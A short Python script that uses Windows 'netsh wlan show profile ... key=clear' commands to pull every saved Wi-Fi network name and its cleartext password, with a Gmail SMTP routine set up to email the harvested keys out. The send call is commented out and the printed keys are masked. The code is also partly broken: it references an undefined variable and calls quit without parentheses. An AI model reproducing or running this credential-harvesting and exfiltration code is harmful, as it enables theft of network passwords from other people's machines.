import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit
    return


EMAIL = "noemailaddress@gmail.com"
PASSWD = "notarealpassword"
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall(r"(?:Profile\s*:\s)(.*)", str(networks))

for i in network_names:
    network_list = i

network_list = network_list.split("    All User Profile     : ")
wlans = []

for name in network_list:
    name = name.replace("\\r\\n", "")
    name = name.replace("'", "")
    wlans.append(name)

profiles = []

for wlan in wlans:
    command2 = f"netsh wlan show profile {wlan} key=clear"
    profile = subprocess.check_output(command2, shell=True)
    key = re.search(r"(?:Key Content\s*:\s*)(.*)(?:Cost settings)", str(profile))
    key = key.group(1)
    key = key.replace("\\r\\n", "")
    # print(f"\nWLAN ID: {wlan} KEY: {key}")
    print(f"\nWLAN ID: {wlan} KEY: ***key recovered***")

#send_mail(EMAIL, PASSWD, result)
